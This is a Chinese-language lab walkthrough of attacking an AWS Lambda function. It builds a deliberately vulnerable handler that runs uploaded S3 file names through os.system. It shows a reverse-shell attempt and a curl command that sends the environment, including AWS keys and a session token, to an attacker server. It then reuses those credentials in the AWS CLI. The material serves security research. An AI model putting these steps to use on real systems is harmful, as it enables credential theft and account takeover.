# 前言
## 1、这篇文章讲了什么？
文本围绕三个问题
1、lambda会遇到什么攻击场景
2、什么情况下，在lambda中读取到的env环境变量密钥可以让我们接管服务器甚至整个账号
3、什么情况下，可以通过lambda权限去横向到其他的EC2服务器
本文会对这三个问题进行解答，并且进行演示
## 2、什么是ServerLess和Lambda
**Serverless** ，即 **无服务器计算**
。然而Serverless不是不再需要服务器，而是公司或开发者不用过多考虑服务器的问题，计算资源仅作为一种服务而不再以物理硬件的形式出现。
**为什么使用ServerLess**
Serverless免除公司和开发者对服务器维护的麻烦，因此也不用考虑DevOps了。公司和开发者只需关注应用的开发和运维即可，因此Serverless可以在更大程度上节约运维的成本。
**Serverless的优势**
  * 可用性冗余，以便单个机器故障不会导致服务中断
  * 冗余副本的地理分布，以便在发生灾难时保留服务
  * 负载平衡和请求路由以有效利用资源
  * 响应负载变化进行自动缩放以扩展或缩小系统
  * 监控以确保服务仍然运行良好
  * 记录以记录调试或性能调整所需的消息
  * 系统升级，包括安全修补
  * 迁移到新实例时可用
选自阿里云
> 
# 一、场景搭建与实践
>  east-1#/create/function>
## 1、创建一个lambda函数
这里都是用默认的设置  
并且我们对执行的角色也是用默认的选项  
在高级设置中，我们也保持默认
## 2、为lambda函数添加触发器
在编写函数代码之前，我们需要添加触发器  
为了演示方便，我们不去考虑这个函数在业务中的具体作用，只需在意这个函数在什么时候触发即可  
首先我们创建一个S3 存储桶  
并且我们在刚刚创建的函数添加触发器，并且选择这个存储桶，触发的事件类型也选择所有对象创建事件  
在我们开始编写函数前，我们需要知道，在S3上传对象时，所获取到的内容是什么样子的  
上传一个文件，触发一下日志  
随后在cloud watch中就可以看到上传的日志  
这里可以看到object中的key是上传的文件名，那假设函数获取的文件名并且当成命令执行，那么在上传文件时如果未对文件进行重命名就会造成问题，或者更加直接一些，我们直接获取文件的内容，将内容当做命令执行，或者写一个flask或者django的服务来接收参数然后执行命令
> 这里看上去会比较鸡肋，因为毕竟太刻意了，黑盒模式下也不太好遇上，这里的举例只做研究使用
我们将这里的Json数据取出来，然后丢到lambda测试，这样更加方便
这里我们主要关注这个event，对event的数据进行处理
    import json
    def lambda_handler(event, context):
        for i in event['Records']:
            getObjectName = i['s3']['object']['key']
            print(getObjectName)
这样可以单独把文件名取出来
开始对这个文件名进行处理，直接使用Split函数对文件名进行.号分割，取下标值即可取到文件名
    import json
    import os
    def lambda_handler(event, context):
        for i in event['Records']:
            getObjectName = i['s3']['object']['key']
            getSplitObjectName = getObjectName.split('.')
            os.system(getSplitObjectName[0])
为了方便测试 手动把测试数据的KEY改为whoami.jpeg
点击Test函数，查看返回结果
## 3、执行命令
### 3.1、反弹shell
那么此时尝试反弹Shell，看看是否能弹回来
    exec /bin/sh 0&0 2>&0
代码需要改成下面这样
    import json
    import os
    def lambda_handler(event, context):
        for i in event['Records']:
            getObjectName = i['s3']['object']['key']
            getSplitObjectName = getObjectName.rsplit('.', 1)
            print((getSplitObjectName))
为什么要用rsplit而不用split呢？因为只需要取最后一个.点开始分割，如果使用split，会把IP地址也进行分割
    import json
    import os
    def lambda_handler(event, context):
        try:
            for i in event['Records']:
                getObjectName = i['s3']['object']['key']
                getSplitObjectName = getObjectName.rsplit('.', 1)
                os.system(getSplitObjectName[0])
        except Except as e:
            print(e)
将这个代码更新到lambda函数中，随后运行Test
NC监听发现，这里会显示有连接过来，但是会超时，导致连不上，我一开始以为是国内服务器的问题，换了一台香港服务器也还是如此
既然反弹Shell失败的话，我们先暂且不去研究到底是为什么导致无法连接，那么能不能读env信息呢？答案是可以的
### 3.2、读取env信息
用DNSLOG外带平台，或者NC监听都行
> 
这里使用服务器来NC监听，然后使用curl来进行请求
    curl -X POST -d  \"`env`\" vps:80.jpeg
从图片中可以看到，将env信息带了出来，那么此时有AWS_ACCESS_KEY_ID和AWS_SECRET_ACCESS_KEY，可以进行利用吗？
首先我们看一这个Key能做一些什么？
#### 3.2.1、黑盒盲猜Key的权限
这里肯定会遇到一个问题，将ID和KEY配置到aws cli中会出现下面的情况
> An error occurred (AuthFailure) when calling the DescribeInstances
> operation: AWS was not able to validate the provided access credentials
这里提示我们，AWS无法验证所提供的的凭证，那么是写错了吗？其实还需要提供上面的token，如何添加？
    vim ~/.aws/credentials
加上aws_session_token = xxxx
在执行列EC2的命令，就会提示没有权限
    aws ec2 describe-instances
但是这里有这么多的API，怎么知道这个KEY有什么权限呢？这就需要切换到白盒的方式，因为创建lambda函数的时候，所有的配置都是用的默认的，这个时候，只需要确定默认配置创建的IAM给的权限是多少即可
来到IAM，查看这个系统创建的角色有哪些权限
点击策略名称
进去之后可以发现，只有三个权限
1、CreateLogGroup-创建日志组
>
> 
2、CreateLogStream-创建日志流
>
> 
3、PutLogEvents-将日志事件上传到指定的日志流
>